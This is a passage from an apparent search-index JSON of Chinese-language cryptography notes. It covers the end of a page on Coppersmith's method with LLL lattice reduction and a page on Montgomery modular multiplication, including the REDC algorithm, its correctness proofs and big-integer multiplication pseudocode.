0\\)\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u73b0\u6210\u200b\u7684\u200b\u8fed\u4ee3\u6cd5\u200b\u6765\u200b\u5bfb\u627e\u200b\u65b9\u7a0b\u200b\u7684\u200b\u89e3\u200b\u3002\u200b\u4f46\u200b\u6b64\u5904\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u540c\u4f59\u200b\uff0c\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6c42\u89e3\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b Coppersmith \u200b\u7b97\u6cd5\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u628a\u200b\u672a\u77e5\u200b\u95ee\u9898\u200b\u53d8\u6210\u200b\u5df2\u77e5\u200b\u7684\u200b\u95ee\u9898\u200b\u6765\u200b\u6c42\u89e3\u200b\uff1a\u200b\u5b58\u5728\u200b \\(x_0\\) \u200b\u4f7f\u5f97\u200b \\(f(x_0)=0 \\pmod n\\)\uff0c\u200b\u5982\u679c\u200b \\(x_0\\) \u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\\(n\\) \u200b\u6bd4\u8f83\u200b\u5927\u200b\uff0c\u200b\u80fd\u5426\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(g(x)\\) \u200b\u4f7f\u5f97\u200b \\(g(x_0)=0\\)\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u7cfb\u6570\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u5c0f\u5230\u200b\u5728\u200b \\(x\\) \u200b\u5904\u4e8e\u200b\u4e00\u5b9a\u200b\u8303\u56f4\u200b\u5185\u65f6\u200b\uff0c\\(g(x)\\) \u200b\u4e0d\u4f1a\u200b\u8d85\u51fa\u200b \\(n\\)\uff0c\u200b\u56e0\u4e3a\u200b\u6b64\u65f6\u200b\u6ca1\u6709\u200b\u540c\u4f59\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6765\u200b\u6c42\u89e3\u200b\u65b9\u7a0b\u200b\u3002</p> <p>\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\uff0cCoppersmith \u200b\u7b97\u6cd5\u200b\u5206\u4e3a\u200b\u4e24\u6b65\u200b\uff1a</p> <ol> <li>\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(g(x)\\)\uff0c\u200b\u4f7f\u5f97\u200b \\(f(x) = 0 \\pmod n\\) \u200b\u65f6\u200b \\(g(x) = 0 \\pmod n\\) \u200b\u6210\u7acb\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u7cfb\u6570\u200b\u8f83\u200b\u5c0f\u200b</li> <li>\u200b\u4f7f\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6c42\u89e3\u200b \\(g(x) = 0\\)\uff08\u200b\u4e0d\u200b\u8003\u8651\u200b \\(\\bmod n\\)\uff09\uff0c\u200b\u4ece\u800c\u200b\u5f97\u5230\u200b \\(f(x) = 0 \\pmod n\\) \u200b\u7684\u200b\u89e3\u200b</li> </ol> <p>\u200b\u6838\u5fc3\u200b\u95ee\u9898\u200b\u662f\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u600e\u4e48\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u7cfb\u6570\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b \\(g(x)\\)\uff1f\u200b\u7b54\u6848\u200b\u662f\u200b\u627e\u200b\u66f4\u200b\u9ad8\u200b\u6b21\u6570\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(f(x) = x^2+ax+b\\)\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff1a</p> \\[\\begin{align} x^2+ax+b \\\\ (x^2+ax+b)x \\\\ (x^x+ax+b)^2 \\\\ (x^x+ax+b)^2x \\\\ \\end{align}\\] <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b \\(x_0\\) \u200b\u662f\u200b\u4e0a\u9762\u200b\u8fd9\u4e9b\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6839\u200b\u3002\u200b\u628a\u200b\u8fd9\u4e9b\u200b\u591a\u9879\u5f0f\u200b\u5316\u7b80\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e86\u200b\u4e00\u7cfb\u5217\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\u5411\u91cf\u200b\u6784\u6210\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u89c4\u7ea6\u200b\uff1a\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u57fa\u200b\u5bf9\u5e94\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u5c31\u662f\u200b \\(g(x)\\)\u3002\u200b\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6c42\u89e3\u200b \\(g(x)\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b \\(x_0\\)\u3002</p>"},{"location":"cryptography/lll.html#_6","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Factoring polynomials with rational coefficients</li> <li>Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm</li> <li>Selected Applications of LLL in Number Theory</li> <li>A Course in Computational Algebraic Number Theory</li> </ul>"},{"location":"cryptography/montgomery_mul_mod.html","title":"Montgomery \u200b\u6a21\u4e58","text":"<p>\u200b\u672c\u6587\u200b\u540c\u6b65\u200b\u53d1\u5e03\u200b\u5230\u200b\u672c\u4eba\u200b\u7684\u200b\u77e5\u4e4e\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_1","title":"\u80cc\u666f","text":"<p>\u200b\u5728\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u6a21\u4e58\u200b\u64cd\u4f5c\u200b\uff1a\\(a * b \\bmod N\\)\u3002\u200b\u6734\u7d20\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5148\u6c42\u200b\u51fa\u200b \\(a * b\\)\uff0c\u200b\u518d\u200b\u5bf9\u200b N \u200b\u8fdb\u884c\u200b\u9664\u6cd5\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f59\u6570\u200b\u5c31\u662f\u200b\u6a21\u4e58\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002</p> <p>\u200b\u4f46\u200b\u7531\u4e8e\u200b\u6b64\u65f6\u200b\u7684\u200b \\(a\\) \\(b\\) \\(N\\) \u200b\u4e09\u4e2a\u200b\u6570\u90fd\u200b\u5f88\u5927\u200b\uff0c\u200b\u5728\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u9700\u8981\u200b\u7528\u5927\u200b\u6574\u6570\u200b\u6765\u200b\u8868\u793a\u200b\uff0c\u200b\u800c\u200b\u5927\u200b\u6574\u6570\u200b\u7684\u200b\u4e58\u6cd5\u200b\u548c\u200b\u9664\u6cd5\u200b\u90fd\u200b\u662f\u200b\u9700\u8981\u200b\u8017\u200b\u6bd4\u8f83\u200b\u591a\u200b\u7684\u200b\u65f6\u95f4\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u7528\u200b Sch\u00f6nhage\u2013Strassen \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u4e24\u4e2a\u200b \\(n\\) \u200b\u4f4d\u5927\u200b\u6574\u6570\u200b\u7684\u200b\u4e58\u6cd5\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u95f4\u200b\u662f\u200b \\(O(n \\log(n) \\log(\\log(n)))\\)\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_2","title":"\u5b9a\u4e49","text":"<p>Montgomery \u200b\u6a21\u4e58\u200b\u662f\u200b\u4e00\u79cd\u200b\u63d0\u9ad8\u200b\u6a21\u4e58\u200b\u7684\u200b\u6027\u80fd\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u5177\u4f53\u200b\u5730\u200b\uff0cMontgomery \u200b\u6a21\u4e58\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u53c2\u6570\u200b \\(R\\) \u200b\u6ee1\u8db3\u200b \\(R\\) \u200b\u548c\u200b \\(N\\) \u200b\u4e92\u8d28\u200b\uff0c\u200b\u4e14\u200b \\(R &gt; N\\)\uff0c\u200b\u90a3\u4e48\u200b Montgomery \u200b\u6a21\u4e58\u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u5982\u4e0b\u200b\u8ba1\u7b97\u200b\uff1a</p> \\[ M(a, b) = a * b * R^{-1} \\bmod N \\]"},{"location":"cryptography/montgomery_mul_mod.html#_3","title":"\u7528\u9014","text":"<p>\u200b\u8fd9\u200b\u770b\u8d77\u6765\u200b\u5f88\u200b\u5947\u602a\u200b\uff0c\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u5728\u200b\u539f\u6765\u200b\u7684\u200b \\(a*b\\) \u200b\u4e0a\u200b\u518d\u200b\u591a\u200b\u4e58\u200b\u4e00\u9879\u200b\uff1a\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u628a\u200b\u539f\u6765\u200b\u5bf9\u200b \\(N\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\uff0c\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u5bf9\u200b \\(R\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\uff0c\u200b\u800c\u200b\u5982\u679c\u200b\u628a\u200b \\(R\\) \u200b\u9009\u62e9\u200b\u4e3a\u200b\u4e8c\u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u786c\u4ef6\u200b\u4e0a\u200b\u5b9e\u73b0\u200b \\(R\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\u5c31\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u4f4d\u200b\u8fd0\u7b97\u200b\u5373\u53ef\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u514d\u53bb\u200b\u4e86\u200b\u539f\u6765\u200b\u5f88\u6162\u200b\u7684\u200b\u9664\u6cd5\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\u4f1a\u200b\u5f15\u5165\u200b\u989d\u5916\u200b\u7684\u200b \\(R^{-1}\\) \u200b\u7cfb\u6570\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\u4e0d\u662f\u200b\u60f3\u8981\u200b\u7684\u200b \\(a * b\\)\u3002\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b\u597d\u200b \\(R^2 \\bmod N\\)\uff0c\u200b\u7136\u540e\u200b\u5148\u200b\u7528\u200b Montgomery \u200b\u6a21\u4e58\u200b\u628a\u200b\u8981\u200b\u8ba1\u7b97\u200b\u7684\u200b\u6570\u200b\u90fd\u200b\u4e58\u4ee5\u200b \\(R\\)\uff1a</p> \\[\\begin{align} M(a, R^2) \\equiv a * R^2 * R^{-1} \\equiv aR \\pmod N \\\\ M(b, R^2) \\equiv b * R^2 * R^{-1} \\equiv bR \\pmod N \\\\ \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u6240\u6709\u200b\u6570\u90fd\u200b\u81ea\u5e26\u200b\u4e00\u4e2a\u200b \\(R\\) \u200b\u7684\u200b\u7cfb\u6570\u200b\uff0c\u200b\u6b64\u65f6\u200b\u518d\u200b\u8fdb\u884c\u200b Montgomery \u200b\u4e58\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\uff1a</p> \\[ M(aR, bR) \\equiv (aR) * (bR) * R^{-1} \\equiv abR \\pmod N \\] <p>\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b \\(ab\\) \u200b\u4e58\u4ee5\u200b \\(R\\) \u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u548c\u200b\u5176\u4ed6\u200b\u5e26\u6709\u200b \\(R\\) \u200b\u7cfb\u6570\u200b\u7684\u200b\u503c\u200b\u8fdb\u884c\u200b\u8fd0\u7b97\u200b\u3002\u200b\u5f53\u200b\u6700\u540e\u200b\u8fd0\u7b97\u200b\u5b8c\u6210\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8981\u200b\u628a\u200b\u7ed3\u679c\u200b\u6062\u590d\u200b\u5230\u200b\u539f\u6765\u200b\u7684\u200b\u503c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u518d\u200b\u548c\u200b \\(1\\) \u200b\u8fdb\u884c\u200b Montgomery \u200b\u4e58\u200b\uff0c\u200b\u5373\u53ef\u200b\u5f97\u5230\u200b\u6700\u7ec8\u200b\u7ed3\u679c\u200b</p> \\[ M(abR, 1) \\equiv abR * 1 * R^{-1} \\equiv ab \\bmod N \\] <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u7528\u200b Montgomery \u200b\u6a21\u4e58\u6765\u200b\u8fdb\u884c\u200b\u52a0\u901f\u200b\uff0c\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u4e09\u4e2a\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u628a\u200b\u6240\u6709\u200b\u6570\u90fd\u200b\u8fdb\u884c\u200b Montgomery \u200b\u6a21\u4e58\u200b\uff0c\u200b\u4e58\u4ee5\u200b \\(R^2 \\bmod N\\)\uff0c\u200b\u628a\u200b\u6240\u6709\u200b\u6570\u90fd\u200b\u6dfb\u52a0\u200b\u4e0a\u200b \\(R\\) \u200b\u7684\u200b\u7cfb\u6570\u200b</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u6309\u7167\u200b\u6b63\u5e38\u200b\u7684\u200b\u6d41\u7a0b\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u6240\u6709\u200b\u503c\u200b\u90fd\u200b\u5e26\u6709\u200b \\(R\\) \u200b\u7cfb\u6570\u200b\uff0c\u200b\u540c\u65f6\u200b\u6240\u6709\u200b\u7684\u200b\u6a21\u4e58\u200b\u90fd\u200b\u88ab\u200b\u66ff\u6362\u200b\u4e3a\u4e86\u200b\u66f4\u52a0\u200b\u9ad8\u6548\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b</li> <li>\u200b\u7b2c\u4e09\u6b65\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u548c\u200b \\(1\\) \u200b\u8fdb\u884c\u200b Montgomery \u200b\u6a21\u4e58\u200b\uff0c\u200b\u8fd8\u539f\u200b\u4e3a\u200b\u771f\u5b9e\u200b\u503c\u200b</li> </ol> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u53ea\u8981\u200b\u4e2d\u95f4\u200b\u8ba1\u7b97\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u662f\u200b\u5927\u5934\u200b\uff0c\u200b\u521d\u59cb\u5316\u200b\u548c\u200b\u6700\u540e\u200b\u7684\u200b\u5904\u7406\u200b\u65f6\u95f4\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5ffd\u7565\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4eab\u53d7\u200b\u5230\u200b Montgomery \u200b\u6a21\u4e58\u200b\u5e26\u6765\u200b\u7684\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_4","title":"\u7b97\u6cd5","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u4ecb\u7ecd\u200b Montgomery \u200b\u7684\u200b\u5177\u4f53\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u770b\u770b\u200b\u5b83\u200b\u5982\u4f55\u200b\u63d0\u9ad8\u200b\u6a21\u4e58\u200b\u6027\u80fd\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#redc","title":"REDC","text":"<p>\u200b\u9996\u5148\u200b\u4ecb\u7ecd\u200b Montgomery \u200b\u7684\u200b REDC \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8ba1\u7b97\u200b \\(a * b * R^{-1} \\bmod N\\) \u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u6b65\u9aa4\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b \\(N'\\)\uff0c\u200b\u6ee1\u8db3\u200b \\(NN' \\equiv -1 \\bmod R\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(T=a*b\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(m=((T \\bmod R)N') \\bmod R\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(t=(T + mN) / R\\)</li> <li>\u200b\u5982\u679c\u200b \\(t \\ge N\\)\uff0c\u200b\u90a3\u4e48\u200b \\(a * b * R^{-1} \\bmod N = t - N\\)</li> <li>\u200b\u5426\u5219\u200b \\(a * b * R^{-1} \\bmod N = t\\)</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u53ea\u200b\u6d89\u53ca\u200b\u5230\u200b\u5173\u4e8e\u200b \\(R\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\uff0c\u200b\u4e0d\u200b\u6d89\u53ca\u200b\u5230\u200b\u5173\u4e8e\u200b \\(N\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\u3002\u200b\u4e0b\u9762\u200b\u63a8\u5bfc\u200b\u4e00\u4e0b\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0a\u9762\u200b\u7684\u200b\u516c\u5f0f\u200b\u662f\u200b\u6b63\u786e\u200b\u7684\u200b\uff1a</p> <p>\u200b\u9996\u5148\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u51fa\u73b0\u200b\u4e86\u200b \\(t = (T+mN) / R\\)\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b \\(t\\) \u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u9700\u8981\u200b\u8bc1\u660e\u200b \\(T+mN\\) \u200b\u53ef\u4ee5\u200b\u6574\u9664\u200b \\(R\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u6c42\u200b \\(T + mN \\equiv 0 \\pmod R\\)\uff1a</p> \\[\\begin{align} T + mN &amp;\\equiv T + (((T \\bmod R)N') \\bmod R)N \\pmod R \\\\ &amp;\\equiv T + TN'N \\pmod R \\\\ &amp;\\equiv T + T(-1) \\pmod R \\\\ &amp;\\equiv 0 \\pmod R \\end{align}\\] <p>\u200b\u8bf4\u660e\u200b \\(t\\) \u200b\u662f\u200b\u6574\u6570\u200b\u3002\u200b\u5176\u6b21\u200b\uff0c\u200b\u9700\u8981\u200b\u8bc1\u660e\u200b \\(a * b * R^{-1} \\equiv t \\pmod N\\)\uff1a</p> \\[\\begin{align} t &amp;= (T + mN) / R \\\\ &amp;\\equiv (T + mN) R^{-1} \\pmod N \\\\ &amp;\\equiv TR^{-1} + mNR^{-1} \\pmod N \\\\ &amp;\\equiv TR^{-1} + 0 \\pmod N \\\\ &amp;\\equiv a * b * R^{-1} \\pmod N \\end{align}\\] <p>\u200b\u8bf4\u660e\u200b \\(t\\) \u200b\u548c\u200b\u7b54\u6848\u200b \\(a * b * R^{-1}\\) \u200b\u5728\u6a21\u200b \\(N\\) \u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b \\(m\\) \u200b\u7684\u200b\u5b9a\u4e49\u200b\uff0c\\(m\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u662f\u200b \\([0, R-1]\\)\uff0c\u200b\u540c\u65f6\u200b \\(a, b \\in [0, N-1]\\)\uff0c\u200b\u4e14\u200b\u5df2\u77e5\u200b \\(N &lt; R\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(t\\) \u200b\u7684\u200b\u8303\u56f4\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((N-1)(N-1) + (R-1)N) / R \\\\ &amp;&lt; (RN + RN) / R \\\\ &amp;= N + N \\\\ &amp;= 2N \\end{align}\\] <p>\u200b\u56e0\u6b64\u200b \\(t \\in [0, 2N-1]\\)\u3002\u200b\u524d\u9762\u200b\u5df2\u7ecf\u200b\u8bc1\u660e\u200b\uff0c\\(t\\) \u200b\u548c\u200b\u7b54\u6848\u200b \\(a * b * R^{-1}\\) \u200b\u5728\u6a21\u200b \\(N\\) \u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\u3002\u200b\u5728\u200b \\([0, 2N-1]\\) \u200b\u8303\u56f4\u200b\u5185\u200b\uff0c\u200b\u6a21\u200b \\(N\\) \u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\u53ea\u6709\u200b\u4e24\u79cd\u200b\u53ef\u80fd\u200b\uff1a\u200b\u76f8\u7b49\u200b\u6216\u8005\u200b\u5dee\u200b\u4e00\u4e2a\u200b \\(N\\)\u3002\u200b\u6240\u4ee5\u200b REDC \u200b\u7b97\u6cd5\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\u5c31\u662f\u200b\uff1a\u200b\u5982\u679c\u200b \\(t \\ge N\\)\uff0c\u200b\u53ea\u200b\u53ef\u80fd\u200b \\(t\\) \u200b\u548c\u200b\u7b54\u6848\u200b\u5dee\u200b\u4e00\u4e2a\u200b \\(N\\)\uff0c\u200b\u6240\u4ee5\u200b\u7b54\u6848\u200b \\(a * b * R^{-1} \\bmod N = t - N\\)\uff1b\u200b\u5426\u5219\u200b \\(t &lt; N\\)\uff0c\u200b\u6b64\u65f6\u200b\u7b54\u6848\u200b \\(a * b * R^{-1} \\bmod N = t\\)\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#montgomery_1","title":"\u5927\u200b\u6574\u6570\u200b Montgomery \u200b\u6a21\u4e58","text":"<p>\u200b\u5b9e\u9645\u200b\u5728\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u8fd0\u884c\u200b Montgomery \u200b\u7b97\u6cd5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u8fd9\u4e9b\u200b\u6570\u90fd\u200b\u5f88\u5927\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e3a\u4e86\u200b\u8868\u793a\u200b\u5927\u200b\u6574\u6570\u200b\uff0c\u200b\u9700\u8981\u200b\u7528\u200b\u56fa\u5b9a\u200b\u4f4d\u6570\u200b\u7684\u200b\u6574\u6570\u200b\u6570\u7ec4\u200b\u6765\u200b\u8868\u793a\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7528\u200b\u591a\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\u6765\u200b\u8868\u793a\u200b\u4e00\u4e2a\u200b\u5927\u200b\u6574\u6570\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u628a\u200b\u5927\u200b\u6574\u6570\u200b\u8fd0\u7b97\u200b\u62c6\u6210\u200b\u591a\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\u7684\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u5927\u200b\u6574\u6570\u200b\u7684\u200b\u8fd0\u7b97\u200b\u548c\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7ed3\u5408\u200b\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u5f97\u5230\u200b\u66f4\u200b\u9ad8\u6027\u80fd\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b\u3002</p> <p>\u200b\u8bba\u6587\u200b Analyzing and Comparing Montgomery Multiplication Algorithms \u200b\u5206\u6790\u200b\u4e86\u200b\u51e0\u79cd\u200b\u6df7\u5408\u200b\u4e86\u200b\u5927\u200b\u6574\u6570\u200b\u8fd0\u7b97\u200b\u548c\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7684\u200b\u7b97\u6cd5\u200b\u3002\u200b\u4e0b\u9762\u200b\u8bb2\u89e3\u200b\u8bba\u6587\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b\u90e8\u5206\u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u5728\u200b\u4e0b\u9762\u200b\u7684\u200b\u8ba8\u8bba\u200b\u4e2d\u200b\uff0c\u200b\u5047\u8bbe\u200b\u673a\u5668\u200b\u6574\u6570\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u662f\u200b \\(w\\) \u200b\u4f4d\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(w=64\\) \u200b\u8868\u793a\u200b\u7528\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\u8fdb\u884c\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6b64\u65f6\u200b \\(R=2^{sw}\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\\(R\\) \u200b\u7b49\u4e8e\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) \u200b\u4f4d\u200b\u6574\u6570\u200b\u53ef\u4ee5\u200b\u8868\u793a\u200b\u7684\u200b\u6700\u5927\u503c\u200b\u52a0\u4e00\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9664\u4ee5\u200b \\(R\\) \u200b\u76f8\u5f53\u4e8e\u200b\u820d\u5f03\u200b\u6700\u4f4e\u200b\u7684\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) \u200b\u4f4d\u200b\u6574\u6570\u200b\u3002\u200b\u540c\u65f6\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b\uff0c\\(a\\) \\(b\\) \\(N\\) \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7528\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) \u200b\u4f4d\u200b\u6574\u6570\u200b\u8868\u793a\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#separated-operand-scanning","title":"Separated Operand Scanning","text":"<p>\u200b\u7b2c\u4e00\u79cd\u200b\u65b9\u6cd5\u200b\u662f\u200b Separated Operand Scanning \u200b\u65b9\u6cd5\u200b\uff08\u200b\u540c\u65f6\u200b\u4e5f\u200b\u662f\u200b Wikipedia \u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b MultiPrecisionREDC \u200b\u7b97\u6cd5\u200b\uff09\uff0c\u200b\u5b83\u200b\u7684\u200b\u6b65\u9aa4\u200b\u662f\u200b\uff1a</p> <p>\u200b\u7b2c\u4e00\u6b65\u200b\uff1a\u200b\u6309\u7167\u200b\u4f20\u7edf\u200b\u65b9\u5f0f\u200b\u8fdb\u884c\u200b\u5927\u200b\u6574\u6570\u200b\u4e58\u6cd5\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(T = a*b\\)\uff1a</p> <pre><code># t = a * b\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[i+j] + a[j]*b[i] + C\n        t[i+j] := S\n    t[i+s] := C\n</code></pre> <p>\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u653e\u5728\u200b \\(t\\) \u200b\u6570\u7ec4\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u6c42\u200b \\(t = (T + mN) / R\\)\uff0c\u200b\u6b64\u65f6\u200b \\(T\\) \u200b\u5df2\u7ecf\u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u9996\u5148\u200b\u8981\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(m=((T \\bmod R)N') \\bmod R\\)\uff0c\u200b\u5728\u200b\u8fd9\u91cc\u200b \\(\\bmod R\\) \u200b\u5c31\u662f\u200b\u53d6\u200b\u5927\u6570\u200b\u7684\u200b\u6700\u4f4e\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) 